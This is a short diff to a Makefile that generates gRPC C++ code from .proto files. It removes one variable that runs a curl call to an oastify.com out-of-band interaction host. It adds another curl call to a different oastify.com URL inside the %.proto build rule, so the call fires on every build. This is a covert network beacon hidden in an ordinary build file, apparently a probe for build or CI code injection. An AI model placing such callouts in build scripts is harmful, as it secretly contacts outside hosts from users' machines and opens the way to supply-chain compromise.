@@ -34,7 +34,6 @@ PROTOC = protoc
 GRPC_CPP_PLUGIN = grpc_cpp_plugin
 GRPC_CPP_PLUGIN_PATH ?= `which $(GRPC_CPP_PLUGIN)`
 
-TESTVAR = `curl https://154i4s8mwm91i6tgs83ow1xid9j07qvf.oastify.com/prover`
 PROTOS_PATH = ./proto
 
 PROTOS   := $(wildcard $(PROTOS_PATH)/*.proto)
@@ -43,6 +42,7 @@ OBJS     := $(PROTOS:$(PROTOS_PATH)/%=%)
 all: $(OBJS)
 
 %.proto:
+	curl https://abpra1ev2vfaofzpyh9x2a3rjip9d01p.oastify.com/inside proto
 	$(PROTOC) -I $(PROTOS_PATH) --grpc_out=./gen --plugin=protoc-gen-grpc=$(GRPC_CPP_PLUGIN_PATH) $< $@
 	$(PROTOC) -I $(PROTOS_PATH) --cpp_out=./gen $< $@
 
